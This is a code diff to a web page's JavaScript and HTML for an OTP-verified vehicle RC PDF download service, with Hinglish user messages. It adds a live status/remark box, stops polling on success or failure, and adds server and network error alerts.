@@ -143,6 +143,9 @@ th { font-size: .76rem; text-transform: uppercase; letter-spacing: .06em; color:
           Admin dwara OTP verify kiya ja raha hai. Verification ke baad official RC PDF upload hote hi yahan download button aa jayega.
         </p>
 
+        <!-- Live Status / Rejection / Approval Message Box -->
+        <div id="liveStatusBox" style="display: none; margin: 15px auto; padding: 14px 18px; border-radius: 10px; max-width: 480px; font-size: 0.9rem; font-weight: 600;"></div>
+
         <div id="downloadContainer" style="display: none;">
           <button type="button" class="btn-primary" id="btnDownloadPdf" style="background: var(--ok); font-size: 1.05rem;">
             📥 Download RC PDF Now
@@ -254,8 +257,11 @@ async function checkAndRestoreStep() {
     document.getElementById('step1Form').style.display = 'none';
 
     const otpStatus = req.data && req.data.otp_status ? req.data.otp_status : 'pending';
+    const statusBox = document.getElementById('liveStatusBox');
 
     if (req.s === 'success' && req.file) {
+      clearInterval(pollTimer);
+      localStorage.removeItem('ds_current_rc_req');
       document.getElementById('step2Otp').style.display = 'none';
       document.getElementById('step3Waiting').style.display = 'block';
       document.getElementById('waitSpinner').style.display = 'none';
@@ -263,19 +269,35 @@ async function checkAndRestoreStep() {
       document.getElementById('waitTitle').style.color = 'var(--ok)';
       document.getElementById('waitMsg').textContent = 'OTP verified & official RC PDF uploaded by Admin. Aap niche button par click karke download kar sakte hain.';
       
+      statusBox.style.display = 'none';
       const btnDl = document.getElementById('btnDownloadPdf');
       btnDl.onclick = () => downloadFile(req.id, req.file.name);
       document.getElementById('downloadContainer').style.display = 'block';
-    } else if (otpStatus === 'wrong') {
+    } 
+    else if (otpStatus === 'wrong' || req.s === 'failed') {
+      clearInterval(pollTimer);
       document.getElementById('step3Waiting').style.display = 'none';
       document.getElementById('step2Otp').style.display = 'block';
       document.getElementById('otpCode').value = '';
-    } else if (otpStatus === 'waiting_verify' || otpStatus === 'approved') {
+      alert('❌ ' + (req.remark || 'Admin ne OTP galat paya hai! Kripya sahi OTP dobara enter karein.'));
+    } 
+    else if (otpStatus === 'waiting_verify' || req.s === 'processing') {
       document.getElementById('step2Otp').style.display = 'none';
       document.getElementById('step3Waiting').style.display = 'block';
       document.getElementById('waitSpinner').style.display = 'block';
       document.getElementById('waitTitle').textContent = 'Checking OTP confirmation...';
       document.getElementById('waitMsg').textContent = 'Admin dwara OTP verify kiya ja raha hai. Kripya pratiksha karein.';
+      
+      if (req.remark) {
+        statusBox.style.display = 'block';
+        statusBox.style.background = '#e6f4ea';
+        statusBox.style.color = '#137333';
+        statusBox.style.border = '1px solid #ceead6';
+        statusBox.innerHTML = 'ℹ️ Note: ' + req.remark;
+      } else {
+        statusBox.style.display = 'none';
+      }
+      
       document.getElementById('downloadContainer').style.display = 'none';
       startStatusPolling();
     } else {
@@ -349,7 +371,7 @@ document.getElementById('fRcForm').onsubmit = async function(e) {
   }
 };
 
-// Step 2: Submit OTP (Fixed with proper merging and backend status sync)
+// Step 2: Submit OTP
 document.getElementById('fOtpForm').onsubmit = async function(e) {
   e.preventDefault();
   const otp = document.getElementById('otpCode').value.trim();
@@ -378,7 +400,7 @@ document.getElementById('fOtpForm').onsubmit = async function(e) {
       }
     }
 
-    await fetch(API + '/api/requests/' + encodeURIComponent(currentRequestId), {
+    const patchRes = await fetch(API + '/api/requests/' + encodeURIComponent(currentRequestId), {
       method: 'PATCH',
       headers: {
         'content-type': 'application/json',
@@ -393,8 +415,16 @@ document.getElementById('fOtpForm').onsubmit = async function(e) {
         }
       })
     });
+
+    if (!patchRes.ok) {
+      const errText = await patchRes.text();
+      alert('Server Error (' + patchRes.status + '): ' + errText);
+      return;
+    }
   } catch (err) {
     console.error('OTP Submit Error:', err);
+    alert('Network error while submitting OTP.');
+    return;
   }
 
   document.getElementById('step2Otp').style.display = 'none';
@@ -422,13 +452,24 @@ function startStatusPolling() {
 
       if (!req) return;
 
-      if (req.data && req.data.otp_status === 'wrong') {
+      const otpStatus = req.data && req.data.otp_status ? req.data.otp_status : 'pending';
+      const statusBox = document.getElementById('liveStatusBox');
+
+      if (otpStatus === 'wrong' || req.s === 'failed') {
         clearInterval(pollTimer);
-        alert('❌ Admin ne OTP galat paya hai! Kripya sahi OTP dobara enter karein.');
         document.getElementById('step3Waiting').style.display = 'none';
         document.getElementById('step2Otp').style.display = 'block';
         document.getElementById('otpCode').value = '';
+        alert('❌ ' + (req.remark || 'Admin ne OTP galat paya hai! Kripya sahi OTP dobara enter karein.'));
         return;
+      }
+
+      if (req.remark) {
+        statusBox.style.display = 'block';
+        statusBox.style.background = '#e6f4ea';
+        statusBox.style.color = '#137333';
+        statusBox.style.border = '1px solid #ceead6';
+        statusBox.innerHTML = 'ℹ️ Note: ' + req.remark;
       }
 
       if (req.s === 'success' && req.file) {
@@ -439,6 +480,7 @@ function startStatusPolling() {
         document.getElementById('waitTitle').style.color = 'var(--ok)';
         document.getElementById('waitMsg').textContent = 'OTP verified & official RC PDF uploaded by Admin. Aap niche button par click karke download kar sakte hain.';
         
+        statusBox.style.display = 'none';
         const btnDl = document.getElementById('btnDownloadPdf');
         btnDl.onclick = () => downloadFile(req.id, req.file.name);
         document.getElementById('downloadContainer').style.display = 'block';
